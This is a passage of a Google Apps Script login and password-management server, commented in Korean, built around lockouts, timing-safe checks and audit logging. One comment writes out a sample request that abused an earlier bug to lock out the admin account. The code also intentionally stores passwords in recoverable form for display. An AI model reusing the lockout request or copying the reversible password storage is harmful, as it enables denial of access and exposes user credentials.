  if (!st.list.length) return { ok: false, code: 'SCOPE_DENIED', msg: '담당 매장이 지정되어 있지 않습니다.', requested: requested };
  if (st.list.length === 1) return { ok: true, target: st.list[0] };   // ★요청값을 읽지 않는다★
  if (!requested) return { ok: true, target: st.list[0] };
  if (st.list.indexOf(requested) >= 0) return { ok: true, target: requested };
  /* 범위 밖 요청. AUTH_ENFORCE='off'라도 '남의 매장 데이터를 내려주는 것'만은 하지 않는다 —
     한 번 나가면 되돌릴 수 없는 유일한 종류의 사고이기 때문이다. off일 때는 오류 대신
     자기 매장으로 되돌려 화면이 멈추지 않게 하고, 기록은 남긴다. */
  if (!enforceOn()) {
    auditLog(ctx, 'resolveTarget', requested, '통과(미적용)', 'SCOPE_DENIED', '자기 매장으로 대체');
    return { ok: true, target: st.list[0] };
  }
  return { ok: false, code: 'SCOPE_DENIED', msg: '담당하지 않는 매장입니다.', requested: requested };
}

/* ---------- 기능층: auth.* (명세 §7-3) ---------- */

/* ★fnLogin·fnSetPassword는 payload를 어떤 형태로도 로깅하지 않는다★
   Logger.log(e.postData.contents) 한 줄이 비밀번호를 실행 로그에 영구히 남긴다. */
/* ★로그인 경로는 하나뿐이다 — 아이디 + 비밀번호★ (확정사항 1·3)
   매장도 관리자도 같은 경로를 탄다. 아이디는 통합시트 D열 매장명 그대로이고, 비밀번호는
   관리자가 accounts.html에서 정해 매장에 알려 준다. 매장 셀프 가입·비밀번호 찾기·
   첫 로그인 강제 변경은 없다.
   ※주소에 실려 다니는 자격증명(?k=… 같은 것)은 만들지 않는다 — 앱 주소를 회사 관련자
     전원에게 공유하는 구조라 앞뒤가 맞지 않는다. */
/* ★전역 스로틀(GBLK)을 로그인 '입구'에서 검사하지 않는다★
   입구에서 검사하면 아무 문자열이나 40번 보내는 것만으로 30분간 관리자 로그인도 26개 매장의
   로그인도 전부 막을 수 있다 — 방어 장치가 그대로 '전원 로그인 차단 버튼'이 된다.
   그래서 자격증명 검증을 먼저 하고, GBLK는 *실패한* 시도에만 적용한다.
   (무차별 대입은 hashBudget 60회/시간 + 계정별 잠금이 이미 막고 있다.) */
function fnLogin(ctx, payload) {
  if (!prop('TOKEN_KEY', '')) return err('SERVER_ERROR', '서버 설정이 끝나지 않았습니다. 담당자에게 문의해 주세요.');
  return loginByPassword(
    String(payload && payload.id ? payload.id : ''),
    String(payload && payload.pw ? payload.pw : ''));
}

const DUMMY_SALT = '00000000-0000-0000-0000-000000000000';

/* 아이디 상한. 아이디가 매장명이 되면서 형식 정규식(소문자 영숫자·_)은 쓸 수 없게 되었지만,
   ★길이 상한은 반드시 남아야 한다★ — 사용자가 보낸 문자열이 그대로
   CacheService('lf:'+id, 키 상한 250자)와 PropertiesService('LK:'+id)의 키가 되기 때문이다.
   본문 상한이 2KB라 1900자짜리 아이디를 보낼 수 있고, 그러면 cache.put이 예외로 빠져
   잠금이 걸리지 않은 채 SERVER_ERROR가 된다. 실제 매장명 중 가장 긴 것이 20자 남짓이다. */
const ID_MAX = 40;

/* 아이디로 쓸 수 있는 문자열인가. 형식이 아니라 '키로 쓸 수 있는가'만 본다 —
   매장명이 아이디이므로 한글·공백·괄호·하이픈이 전부 정상 값이다.
   제어문자만 막는다(로그·시트·캐시 키를 깨뜨리는 유일한 부류다). */
function validId(id) {
  if (!id || id.length > ID_MAX) return false;
  /* 정규식에 제어문자를 직접 적으면 이 소스 파일이 바이너리로 취급되어 diff·검색이 막힌다.
     그래서 코드로 검사한다 — 하는 일은 제어문자(0~31·127) 배제와 같다. */
  for (let i = 0; i < id.length; i++) {
    const c = id.charCodeAt(i);
    if (c < 32 || c === 127) return false;
  }
  return true;
}

function loginByPassword(rawId, pw) {
  const id = normId(rawId);
  if (!id || !pw) return err('AUTH_INVALID', '아이디 또는 비밀번호가 올바르지 않습니다.');
  /* 형식이 틀린 아이디는 '없는 계정'과 완전히 같은 경로를 탄다 — 더미 해시까지 동일하게 돌려
     응답 시간으로 구분되지 않게 하고, 잠금 키만 고정 문자열로 바꿔 키 폭증을 막는다. */
  const idOk = validId(id);
  const lockId = idOk ? id : '(형식오류)';

  // ★잠금·예산 확인이 게이트의 가장 앞이다. 잠금 중이면 해시 계산 자체를 하지 않는다★
  const lk = lockCheck(lockId);
  if (lk.locked) {
    return { ok: false, code: 'LOCKED', retryAfterMin: lk.retryAfterMin, error: '로그인 시도가 많아 잠겼습니다. ' + lk.retryAfterMin + '분 후 다시 시도해 주세요.' };
  }
  /* ★예산은 아이디별로 본다★ — 인자를 빼면 남이 태운 전역 예산 때문에 이 사람이 못 들어간다 */
  if (!hashBudgetOk(lockId)) {
    auditLog(anonCtx(), 'auth.login', '', '거부', 'HASH_BUDGET', '');
    return { ok: false, code: 'LOCKED', retryAfterMin: 60, error: '로그인이 일시적으로 제한되었습니다. 잠시 후 다시 시도해 주세요.' };
  }
  if (!prop('PW_PEPPER', '')) return err('SERVER_ERROR', '서버 설정이 끝나지 않았습니다. 담당자에게 문의해 주세요.');

  const iter = Math.max(1, propN('PW_ITER', 10000));
  const acct = idOk ? getAccount(id) : null;

  /* 존재하지 않는 아이디도 동일하게 카운트하고, 고정 더미 솔트로 동일한 N회 해시를 돌린 뒤
     실패를 반환한다. 빼면 응답 시간으로 유효 아이디를 뽑아낼 수 있다. */
  if (!acct || acct.status !== STATUS_ON) {
    hashBudgetUse(lockId);
    pwHash(DUMMY_SALT, pw, iter);
    /* ★없는 아이디의 원문은 감사로그에 남기지 않는다★ (loginFail 세 번째 인자) */
    return loginFail(lockId, acct ? 'ACCOUNT_DISABLED' : (idOk ? 'NO_ACCOUNT' : 'BAD_ID'), !!acct);
  }

  /* 해시가 비어 있어도 같은 시간을 쓴다 — 여기서 빨리 돌아가면 응답 시간만으로
     "존재하지만 비밀번호가 없는 계정"을 알아낼 수 있다. */
  hashBudgetUse(lockId);
  if (!acct.hash) {
    pwHash(acct.salt || DUMMY_SALT, pw, iter);
  } else {
    const h = pwHash(acct.salt, pw, acct.iter || iter);
    if (ctEq(h, acct.hash)) {
      /* 반복수가 현행 PW_ITER보다 낮으면 그 자리에서 재해시해 덮어쓴다 —
         원문을 아는 유일한 순간이고, 사용자는 아무것도 하지 않는다. */
      if ((acct.iter || 0) < iter || acct.pepperV !== prop('PW_PEPPER_V', '1')) {
        try { writeCredential(acct, pw, iter); } catch (e) { /* 승급 실패가 로그인을 막으면 안 된다 */ }
      }
      return loginSuccess(getAccount(id) || acct, '비밀번호');
    }
  }

  /* 설정코드 분기 — ★관리자 계정 부트스트랩·복구 전용이다★
     매장에는 설정코드를 발급하지 않는다(확정사항 3: 비밀번호는 관리자가 정해서 알려 준다).
     남겨 두는 이유는 하나뿐이다: 관리자 본인이 비밀번호를 잊으면 accounts.html에 들어갈 수
     없고, 그러면 앱 전체를 아무도 복구할 수 없다. 그때 편집기에서 issueAdminSetupCode()를
     돌리는 것이 유일한 탈출구다.
     ★아이디가 실제로 존재할 때만 SET_PW를 준다★ — 없는 아이디에 주면 계정 열거 오라클이 된다. */
  if (checkSetupCode(pw, acct.id)) {
    auditLog({ id: acct.id, role: acct.role }, 'auth.login', '', '성공', 'SET_PW', '설정코드 확인');
    return { ok: false, code: 'SET_PW', error: '최초 로그인입니다. 새 비밀번호를 정해 주세요.' };
  }
  return loginFail(lockId, 'BAD_PASSWORD', true);
}

/* 실패 문구는 항상 동일하다 — 아이디 없음 / 비번 틀림 / 계정 중지를 구분하지 않는다.
   잠금만 예외로 명시한다(알려주지 않으면 계속 시도해 잠금이 무한 연장되고 담당자에게 전화가 온다).

   ★known=false면 아이디 원문을 감사로그에 적지 않는다★
   아이디 입력란에 비밀번호를 치는 것은 흔한 실수인데, 여기 아이디는 한글 매장명이라 형식
   검증이 사실상 없다(validId는 제어문자만 막는다). 그러면 그 비밀번호가 감사로그 '아이디' 칸에
   평문으로 남고, audit.list를 통해 계정 관리 화면에 그대로 표시된다. 존재하지 않는 아이디의
   원문은 감사 가치가 거의 없으므로 해시 앞 8자만 남긴다(같은 값이 반복되는지는 여전히 보인다).
   ※잠금 키(lockFail)에는 원문을 그대로 쓴다 — 그쪽은 사람이 읽는 값이 아니다. */
function loginFail(id, reason, known) {
  globalFail();
  const locked = lockFail(id);
  const logId = known ? id : ('(미상:' + sha256Hex(String(id)).slice(0, 8) + ')');
  auditLog({ id: logId, role: '' }, 'auth.login', '', '실패', reason, locked ? '잠금 발동' : '');
  if (locked) {
    return { ok: false, code: 'LOCKED', retryAfterMin: 15, error: '로그인 시도가 많아 잠겼습니다. 15분 후 다시 시도해 주세요.' };
  }
  // 전역 차단은 '실패한 시도'에만 알린다 (정상 자격증명은 이 함수에 도달하지 않는다)
  const gb = globalBlocked();
  if (gb) return { ok: false, code: 'LOCKED', retryAfterMin: gb, error: '로그인 시도가 많아 잠시 제한되었습니다. ' + gb + '분 후 다시 시도해 주세요.' };
  return err('AUTH_INVALID', '아이디 또는 비밀번호가 올바르지 않습니다.');
}

function loginSuccess(acct, how) {
  lockClear(acct.id);
  writeLastSeen(acct);
  dropAccountCache(acct.id);
  const fresh = getAccount(acct.id) || acct;
  const tk = signToken(fresh);
  if (!tk) return err('SERVER_ERROR', '서버 설정이 끝나지 않았습니다. 담당자에게 문의해 주세요.');
  auditLog({ id: fresh.id, role: fresh.role }, 'auth.login', '', '성공', '', how);
  const s = sessionBody(fresh);
  s.token = tk.token;
  s.exp = tk.exp;
  return s;
}

/* 계정 K열(최근접속). 서버는 A~F를 절대 쓰지 않고 항상 G~K만 쓴다. */
function writeLastSeen(acct) {
  try {
    const ss = authSS();
    if (!ss) return;
    const sh = ss.getSheetByName(AUTH_ACCOUNT_SHEET);
    if (!sh) return;
    const rng = grid(sh, acct.row, ACCT_COL.lastSeen, 1, 1);
    if (!rng) return;
    rng.setValue(Utilities.formatDate(new Date(), ss.getSpreadsheetTimeZone(), 'yyyy-MM-dd HH:mm'));
  } catch (e) { }
}

/* ★최근접속을 로그인 때만 찍으면 안 된다★ (확정사항 4·6)
   세션이 무기한이 된 뒤로 매장은 처음 한 번만 로그인한다. 로그인 시각만 남기면
   계정 관리 화면의 '최근접속'은 발급일에서 영원히 멈추고, 그 칸의 존재 이유
   ("이 매장이 아직 앱을 안 쓰고 있다 → 시트 공유를 언제 닫을 수 있나")가 사라진다.
   그래서 인증된 요청이 올 때마다 갱신하되, 계정당 하루 1회로 눌러 둔다 —
   요청마다 시트 쓰기(200~400ms)를 붙이면 26곳의 체감 속도가 통째로 무너진다.
   캐시가 축출되어 하루에 몇 번 더 써도 무해하다(날짜만 보는 칸이다). */
function touchSeen(acct) {
  try {
    const day = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'yyyyMMdd');
    const k = 'seen:' + acct.id + ':' + day;
    const cache = CacheService.getScriptCache();
    if (cache.get(k)) return;
    cache.put(k, '1', 21600);   // 6시간 (캐시 상한). 하루가 지나면 키 자체가 바뀐다
    stashPrevSeen(acct);        // ★덮어쓰기 직전의 값을 남긴다 (아래 주석)
    writeLastSeen(acct);
  } catch (e) { /* 최근접속 갱신 실패가 요청을 막으면 안 된다 */ }
}

/* ★'NEW' 판정의 기준선 — 최근접속 칸을 덮어쓰기 직전 값을 따로 남겨 둔다★

   왜 필요한가: touchSeen은 그날 첫 인증 요청에서 최근접속을 '지금'으로 갱신하는데,
   그 첫 요청이 바로 홈 화면 진입이다. 그래서 홈이 notify.badge를 부르는 시점에는 이미
   최근접속 = 오늘 09:00 이 되어 있고, 어제 등록된 항목은 영원히 NEW가 되지 않는다.
   (칸 자체를 안 갱신하는 선택지는 없다 — 그 칸은 "이 매장이 아직 앱을 안 쓴다"를 보는
    계정 관리 화면의 근거이고, 세션이 무기한이라 로그인 시각만으로는 멈춰 버린다.)

   그래서 기준선은 '직전에 앱을 쓴 날의 시각'이다. 하루치 세션 내내 값이 고정되므로
   홈을 여러 번 열어도 배지가 도중에 사라지지 않는다.

   ★같은 날짜면 덮어쓰지 않는다★ — 캐시가 축출되어 touchSeen이 같은 날 두 번 돌면
   기준선이 '오늘 아침'으로 밀려 그날의 NEW가 통째로 사라진다. 날짜가 바뀌었을 때만 민다.
   CacheService가 아니라 PropertiesService에 두는 것도 같은 이유다(축출되면 안 되는 값이다).
   키는 계정당 하나로 고정이라 속성이 늘어나지 않는다. */
function prevSeenKey(id) { return 'PSEEN:' + String(id); }

function stashPrevSeen(acct) {
  try {
    const prev = String(acct.lastSeen || '').trim();
    const today = Utilities.formatDate(new Date(), authTz(), 'yyyy-MM-dd');
    if (prev.slice(0, 10) === today) return;   // 오늘 이미 밀어 둔 값이다
    PROPS.setProperty(prevSeenKey(acct.id), prev);
  } catch (e) { }
}

/* 배지·NEW가 쓰는 기준선. 'yyyy-MM-dd HH:mm' (인증 시트 타임존) 또는 ''.
   ★''이면 NEW를 하나도 붙이지 않는다★ — 기준선이 없다는 것은 "이 계정이 앱을 처음 연다"는
   뜻이고, 그때 전 항목에 NEW를 붙이면 배지가 미완료 건수와 똑같아져 아무 정보도 주지 않는다. */
function seenBaseline(id) {
  const stashed = String(PROPS.getProperty(prevSeenKey(id)) || '').trim();
  if (stashed) return stashed;
  const a = getAccount(id);
  return a ? String(a.lastSeen || '').trim() : '';
}

/* 최근접속·감사로그가 쓰이는 타임존 = 인증 시트의 타임존.
   ★응답 시트(ssTz)와 섞어 쓰지 않는다★ — 두 파일의 타임존이 다르면 기준선과 제출시각을
   서로 다른 시계로 재게 되어 NEW가 하루 어긋난다. */
/* ssTz와 같은 이유로 기억해 둔다 — stashPrevSeen은 인증된 요청마다 도는 자리다 */
let _authTzMemo = null;
function authTz() {
  if (_authTzMemo) return _authTzMemo;
  const id = prop('AUTH_SHEET_ID', '');
  _authTzMemo = id ? tzMemo('authtz', id) : Session.getScriptTimeZone();
  return _authTzMemo;
}

/* ---------- 비밀번호 보관 (계정 관리 화면의 '현재 비밀번호' 표시용) ----------

   ★이 서버의 원칙은 '평문은 어디에도 남기지 않는다'였고, 여기 한 곳만 의도적으로 뒤집는다★
     이유는 운영 하나다. 26개 매장의 비밀번호를 담당자 한 사람이 정해 주는 구조인데,
     매장이 "비밀번호가 뭐였죠"라고 물으면 지금까지는 '다시 설정'밖에 답이 없었다.
     그런데 다시 설정하면 그 매장의 기존 로그인이 전부 끊긴다 — 물어본 대가치고 비싸다.

   ★대신 네 가지를 지킨다★
     ① 시트에는 쓰지 않는다. 스크립트 속성에만 둔다 — 인증 시트를 공유하거나 사본을 떠도
        보관값은 따라가지 않는다(`계정` 탭에 열을 하나 늘리지 않은 이유가 이것이다).
     ② 속성에도 평문으로 두지 않는다. PW_SHOW_KEY로 만든 키스트림을 XOR해 hex로 적는다.
     ③ 무결성 확인을 붙인다. MAC에 ★현재 해시★를 섞어 넣으므로, 누군가 시트 G열을 손으로
        고쳐 비밀번호가 달라지면 보관값은 그 즉시 스스로 무효가 된다.
     ④ 맞지 않으면 '모른다'고 답한다. ★옛 값을 '현재 비밀번호'라고 보여 주는 것이
        아무것도 안 보여 주는 것보다 훨씬 위험하다★ — 담당자가 매장에 틀린 값을 불러 준다.

   ★로그인 검증은 여전히 G열 해시로만 한다★ — 이 보관값은 화면 표시 전용이고, 지워지거나
     깨져도 로그인에는 아무 영향이 없다. 속성을 전부 지우면 목록이 '확인 불가'로 바뀔 뿐이고,
     다시 설정하면 그때부터 다시 보인다. */

const PWSHOW_PREFIX = 'PWS:';

/* 보관 전용 키. ★TOKEN_KEY·PW_PEPPER를 재사용하지 않는다★ — 그 둘은 사고가 났을 때
   일부러 바꾸는(= 전원 강제 로그아웃) 수단이라, 거기에 묶어 두면 비상사태를 푸는 순간
   26곳의 보관값이 함께 날아간다. 없으면 그 자리에서 만든다(초기 설정 단계를 늘리지 않게). */
function pwShowKey() {
  let k = prop('PW_SHOW_KEY', '');
  if (!k) {
    k = Utilities.getUuid() + Utilities.getUuid();
    PROPS.setProperty('PW_SHOW_KEY', k);
  }
  return k;
}

/* SHA-256 키스트림. 같은 (키, 논스)면 같은 바이트가 나오므로 논스는 보관할 때마다 새로 만든다
   (같은 스트림에 두 비밀번호를 XOR하면, 둘을 서로 지우는 것만으로 글자가 드러난다). */
function pwShowStream(nonce, n) {
  const key = pwShowKey();
  const out = [];
  let blk = 0;
  while (out.length < n) {
    const h = sha256Hex(key + '|' + nonce + '|' + blk);
    for (let i = 0; i < h.length && out.length < n; i += 2) out.push(parseInt(h.substr(i, 2), 16));
    blk++;
  }
  return out;
}

function pwShowMac(id, nonce, hex, hash) {
  return sha256Hex(pwShowKey() + '|' + normId(id) + '|' + nonce + '|' + hex + '|' +
    String(hash == null ? '' : hash).slice(0, 16)).slice(0, 16);
}

/* 보관. hash는 방금 G열에 쓴 값이다 — 이것을 MAC에 섞는 것이 위 ③의 실행부다.
   ★예외를 밖으로 내지 않는다★ — 보관은 편의 기능이고, 이것이 실패해서 비밀번호 설정 자체가
   실패하면 배본이 전도된다(속성 저장소는 할당량 초과로 실패할 수 있는 자리다). */
function pwStash(id, plain, hash) {
  try {
    const s = String(plain == null ? '' : plain);
    if (!s) { pwStashClear(id); return; }
    const nonce = Utilities.getUuid();
    const b = Utilities.newBlob(s).getBytes();
    const ks = pwShowStream(nonce, b.length);
    let hex = '';
    for (let i = 0; i < b.length; i++) {
      hex += ('0' + (((((b[i] + 256) % 256)) ^ ks[i]) & 255).toString(16)).slice(-2);
    }
    PROPS.setProperty(PWSHOW_PREFIX + normId(id),
      'v1:' + nonce + ':' + hex + ':' + pwShowMac(id, nonce, hex, hash));
  } catch (e) {
    Logger.log('pwStash 실패(무시됨): ' + String(e));
  }
}

function pwStashClear(id) {
  try { PROPS.deleteProperty(PWSHOW_PREFIX + normId(id)); } catch (e) { }
}

/* 꺼내기. props를 넘기면 그 지도에서 읽는다 — 목록 26줄을 그릴 때 속성을 26번 따로 읽지
   않기 위해서다(fnAccountList가 getProperties()를 한 번만 부른다).
   ★어떤 이유로든 확신할 수 없으면 빈 문자열을 돌려준다★ — 화면은 그걸 '확인 불가'로 적는다. */
function pwStashRead(id, hash, props) {
  try {
    if (!hash) return '';                       // 비밀번호가 설정되지 않은 계정
    const k = PWSHOW_PREFIX + normId(id);
    const raw = String((props && props[k] != null) ? props[k] : (PROPS.getProperty(k) || ''));
    if (!raw) return '';
    const p = raw.split(':');
    if (p.length !== 4 || p[0] !== 'v1') return '';
    const nonce = p[1], hex = p[2];
    if (!/^[0-9a-f]*$/.test(hex) || hex.length % 2) return '';
    /* 해시까지 섞은 MAC이다. 비밀번호가 바뀌었는데 보관값이 안 바뀌었으면 여기서 걸러진다 */
    if (!ctEq(pwShowMac(id, nonce, hex, hash), p[3])) return '';
    const n = hex.length / 2;
    const ks = pwShowStream(nonce, n);
    const out = [];
    for (let i = 0; i < n; i++) {
      const v = (parseInt(hex.substr(i * 2, 2), 16) ^ ks[i]) & 255;
      out.push(v > 127 ? v - 256 : v);          // 자바 byte는 부호가 있다 (toHex의 반대 보정)
    }
    return out.length ? Utilities.newBlob(out).getDataAsString() : '';
  } catch (e) {
    return '';
  }
}

/* 목록을 그릴 때 한 번만 부른다. 실패하면 null — pwStashRead가 계정별로 다시 읽는다. */
function pwStashAll() {
  try { return PROPS.getProperties() || null; } catch (e) { return null; }
}

/* 편집기 전용 자기시험. ★실계정을 건드리지 않는다★ — 없는 아이디로 보관하고 되읽어 본 뒤
   끝에 지운다. 편집기에서 testPwStash를 실행하고 [실행 로그]를 보면 된다.
   이 시험이 확인하는 것은 셋이다.
     ① 한글·특수문자·긴 값이 그대로 되돌아오는가 (UTF-8 바이트 왕복)
     ② 해시가 다르면 값을 내지 않는가 — ★옛 비밀번호를 '현재'라고 보여 주는 사고의 방지선★
     ③ 지우면 빈 문자열인가 (그때 화면은 '확인 불가'로 적는다) */
function testPwStash() {
  const id = '__pwstash_test__';
  const hash = 'a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90';
  const cases = ['abcd1234', '한글비밀번호12', 'Aa!@#$%^&*()_+-=[]{};:,.<>?/~`', '가나다라마바사아자차'];
  let bad = 0;
  for (let i = 0; i < cases.length; i++) {
    pwStash(id, cases[i], hash);
    const back = pwStashRead(id, hash, null);
    if (back === cases[i]) {
      Logger.log('✓ [' + i + '] ' + cases[i].length + '자 복원 성공');
    } else {
      bad++;
      Logger.log('✗ [' + i + '] 불일치 — 넣은 값 「' + cases[i] + '」 돌아온 값 「' + back + '」');
    }
  }

  pwStash(id, 'abcd1234', hash);
  const other = pwStashRead(id, 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff', null);
  if (other === '') Logger.log('✓ 해시가 다르면 값을 내지 않는다');
  else { bad++; Logger.log('✗ 해시가 달라도 값이 나왔다: ' + other); }

  pwStashClear(id);
  if (pwStashRead(id, hash, null) === '') Logger.log('✓ 지우면 빈 문자열');
  else { bad++; Logger.log('✗ 지운 뒤에도 값이 나온다'); }

  Logger.log(bad ? ('실패 ' + bad + '건 — 이 상태로는 배포하지 마십시오') : '전부 통과 (' + (cases.length + 2) + '/' + (cases.length + 2) + ')');
  return bad === 0;
}

/* G·H·I·J 기록 (해시·솔트·반복수:페퍼버전·비번변경일). A~F는 건드리지 않는다.
   ★이 함수가 강제 로그아웃 ①의 실행부다★ — 해시가 바뀌면 credFingerprint가 바뀌고,
   dropAccountCache로 캐시까지 즉시 버리므로 그 계정의 모든 기기가 다음 요청에서 끊긴다. */
function writeCredential(acct, plain, iter) {
  const ss = authSS();
  if (!ss) throw new Error('AUTH_SHEET_ID 없음');
  const sh = ss.getSheetByName(AUTH_ACCOUNT_SHEET);
  if (!sh) throw new Error('계정 탭 없음');
  /* ★행 번호를 쓰기 직전에 한 칸으로 재검증한다★
     acct.row는 최대 60초 캐시된 값이다. 그 사이 관리자가 `계정` 탭에서 행을 삭제·삽입·정렬하면
     이 함수는 ★엉뚱한 계정의 G~J열에 해시를 쓴다★ — 예외가 나지 않으므로 아무도 모르고,
     피해 계정은 세션이 전부 끊긴 채 아무도 모르는 비밀번호를 갖게 된다.
     A열 한 칸(수 ms)을 다시 읽는 것으로 그 창을 닫는다. */
  const idCell = grid(sh, acct.row, ACCT_COL.id, 1, 1);
  const onSheet = idCell ? normId(idCell.getValue()) : '';
  if (onSheet !== acct.id) {
    dropAccountCache(acct.id);
    throw new Error('계정 행이 방금 바뀌었습니다. 목록을 새로 고친 뒤 다시 시도해 주세요.');
  }
  const rng = grid(sh, acct.row, ACCT_COL.hash, 1, 4);   // G~J
  if (!rng || rng.getNumColumns() < 4) throw new Error('계정 탭에 해시~비번변경일 칸이 없음');
  const salt = Utilities.getUuid();
  const h = pwHash(salt, plain, iter);
  const tz = ss.getSpreadsheetTimeZone();
  rng.setValues([[h, salt, iter + ':' + prop('PW_PEPPER_V', '1'),
    Utilities.formatDate(new Date(), tz, 'yyyy-MM-dd HH:mm')]]);
  /* ★평문 보관은 이 한 줄뿐이다★ — 여기 두는 이유는 비밀번호가 바뀌는 경로가 셋(관리자 설정,
     본인 변경, 로그인 중 반복수 승급)인데 전부 이 함수를 지나기 때문이다. 호출부마다 적으면
     언젠가 한 곳을 빠뜨리고, 그때 화면은 ★옛 비밀번호를 '현재'라고 보여 준다★.
     h를 함께 넘긴다 — 보관값을 지금 해시에 묶어 두는 것이 그 사고의 마지막 안전망이다. */
  pwStash(acct.id, plain, h);
  dropAccountCache(acct.id);
}

/* ★payload를 어떤 형태로도 로깅하지 않는다★
   경로는 둘뿐이다:
     ① 본인 변경  — 토큰 + 현재 비밀번호 (매장이 스스로 바꾸고 싶을 때. 확정사항 3)
     ② 설정코드   — 관리자 부트스트랩·복구 전용 (issueAdminSetupCode)
   관리자가 남의 비밀번호를 정하는 것은 이 함수가 아니라 account.setPassword다. */
function fnSetPassword(ctx, payload) {
  if (!prop('TOKEN_KEY', '') || !prop('PW_PEPPER', '')) {
    return err('SERVER_ERROR', '서버 설정이 끝나지 않았습니다. 담당자에게 문의해 주세요.');
  }
  const newPw = String(payload && payload.newPw ? payload.newPw : '');
  const setupCode = String(payload && payload.setupCode ? payload.setupCode : '');
  const curPw = String(payload && payload.curPw ? payload.curPw : '');
  const id = normId(payload && payload.id ? payload.id : (ctx.auth ? ctx.id : ''));

  const weak = pwWeak(newPw, id);
  if (weak) return err('BAD_REQUEST', weak);
  if (!id) return err('BAD_REQUEST', '아이디를 입력해 주세요.');
  /* getAccount()·lockFail()의 캐시 키가 되기 전에 형식을 막는다 (loginByPassword와 같은 이유).
     문구는 로그인 실패와 동일하게 둔다 — 여기서 다른 문구를 내면 계정 열거 오라클이 된다. */
  if (!validId(id)) return err('AUTH_INVALID', '아이디 또는 비밀번호가 올바르지 않습니다.');
  if (setupCode && newPw === setupCode) return err('BAD_REQUEST', '설정코드와 다른 비밀번호를 정해 주세요.');

  const iter = Math.max(1, propN('PW_ITER', 10000));
  const acct = getAccount(id);
  if (!acct || acct.status !== STATUS_ON) return err('AUTH_INVALID', '아이디 또는 비밀번호가 올바르지 않습니다.');

  let how = '';
  if (ctx.auth && ctx.id === id && curPw) {
    // 본인 변경 (토큰 있음)
    if (!hashBudgetOk(id)) return { ok: false, code: 'LOCKED', retryAfterMin: 60, error: '잠시 후 다시 시도해 주세요.' };
    hashBudgetUse(id);
    if (!acct.hash || !ctEq(pwHash(acct.salt, curPw, acct.iter || iter), acct.hash)) {
      return err('AUTH_INVALID', '아이디 또는 비밀번호가 올바르지 않습니다.');
    }
    how = '본인 변경';
  } else if (checkSetupCode(setupCode, acct.id)) {
    how = '설정코드';
  } else if (!setupCodeOutstanding(acct.id)) {
    /* ★★인증 없이 남의 계정을 영구히 잠글 수 있던 자리다★★
       이 액션은 optAuth라 토큰 없이 도달한다. 종전에는 여기서 무조건 lockFail(acct.id)을
       불렀으므로, {"action":"auth.setPassword","payload":{"id":"admin","newPw":"aaaaaaaa"}}
       를 10번 보내는 것만으로 관리자가 15분 잠겼다. 시간당 40요청이면 영구 차단이고,
       복구 수단인 accounts.html에 들어갈 사람이 아무도 없게 된다 —
       "저녁 9시에 폰으로 풀어 준다"는 account.* 4개 액션의 존재 이유가 그대로 무효화됐다.
       (덤으로 10회를 보내 LOCKED가 오면 '존재하고 사용 중인 계정'이라는 열거 오라클이었다.)

       ★잠금은 '지금 실제로 맞힐 수 있는 비밀'이 있을 때만 의미가 있다★
       설정코드가 발급되어 있지 않으면(=평소) 이 경로에는 맞힐 대상이 아예 없다. 그러니
       카운터를 올릴 이유도 없다. 계정이 있든 없든 응답이 같으므로 열거 오라클도 사라진다.
       설정코드가 살아 있는 24시간 동안에만 아래 분기로 내려가 무차별 대입을 막는다. */
    return err('AUTH_INVALID', '아이디 또는 비밀번호가 올바르지 않습니다.');
  } else {
    /* 설정코드가 실제로 발급되어 있는데 틀렸다 = 진짜 무차별 대입 시도.
       ★①해시예산 ②계정잠금 ③전역카운터를 균일하게 건다★ — 종전에는 비용(해시예산)을
       한 푼도 물지 않고 벌점(잠금)만 주어서, 방어 장치가 공격 수단이 되어 있었다. */
    if (!hashBudgetOk(id)) return { ok: false, code: 'LOCKED', retryAfterMin: 60, error: '잠시 후 다시 시도해 주세요.' };
    hashBudgetUse(id);
    globalFail();
    const locked = lockFail(acct.id);
    auditLog({ id: acct.id, role: acct.role }, 'auth.setPassword', '', '실패', 'AUTH_INVALID',
      locked ? '잠금 발동' : '');
    if (locked) {
      return { ok: false, code: 'LOCKED', retryAfterMin: 15, error: '시도가 많아 잠겼습니다. 15분 후 다시 시도해 주세요.' };
    }
    return err('AUTH_INVALID', '아이디 또는 비밀번호가 올바르지 않습니다.');
  }

  if (!hashBudgetOk(id)) return { ok: false, code: 'LOCKED', retryAfterMin: 60, error: '잠시 후 다시 시도해 주세요.' };
  hashBudgetUse(id);
  try {
    writeCredential(acct, newPw, iter);
  } catch (e) {
    /* 행 재검증 실패(계정 행이 방금 바뀜) 등. 원문은 실행 로그로만 보낸다 */
    Logger.log('writeCredential 실패: ' + String(e));
    return err('CONFLICT', '계정 정보가 방금 바뀌었습니다. 잠시 후 다시 시도해 주세요.');
  }
  if (how === '설정코드') { try { PROPS.deleteProperty('ADMIN_SETUP'); } catch (e) { } }  // 1회용
  lockClear(acct.id);
  auditLog({ id: acct.id, role: acct.role }, 'auth.setPassword', '', '성공', '', how);
  notifyPasswordChanged(acct, how);

  const fresh = getAccount(acct.id) || acct;
  const tk = signToken(fresh);
  if (!tk) return err('SERVER_ERROR', '서버 설정이 끝나지 않았습니다.');
  const s = sessionBody(fresh);
  s.token = tk.token;
  s.exp = tk.exp;
  return s;
}

/* 관리자 비밀번호는 1년에 한두 번 바뀐다. 그래서 오는 메일 1통이 곧 침해 신호다 (명세 §15). */
function notifyPasswordChanged(acct, how) {
  try {
    const to = Session.getEffectiveUser().getEmail();
    if (!to) return;
    MailApp.sendEmail(to, '[QSC] 비밀번호가 변경되었습니다',
      '계정: ' + acct.id + '\n방식: ' + how +
      '\n시각: ' + new Date() +
      '\n\n본인이 하지 않았다면 즉시 QSC 인증 시트의 계정 탭 E열을 「중지」로 바꾸고 TOKEN_KEY를 교체하십시오.');
  } catch (e) { /* 메일 실패가 비밀번호 변경을 되돌릴 이유는 없다 */ }
}

/* 모든 화면이 진입 시 1회 호출. ★시트에서 역할을 고치면 여기서 반영된다★ */
function fnSession(ctx) {
  if (!ctx.auth) return err('AUTH_REQUIRED', '로그인이 필요합니다.');
  const acct = getAccount(ctx.id);
  if (!acct) return err('AUTH_INVALID', '로그인이 필요합니다.');
  return sessionBody(acct);
}

/* 로그인·세션 공통 응답. stores.list는 해석이 끝난 실제 목록이다 —
   관리자(all:true)에게도 실목록을 함께 내려 매장 선택 드롭다운이 추가 호출 없이 그려진다. */
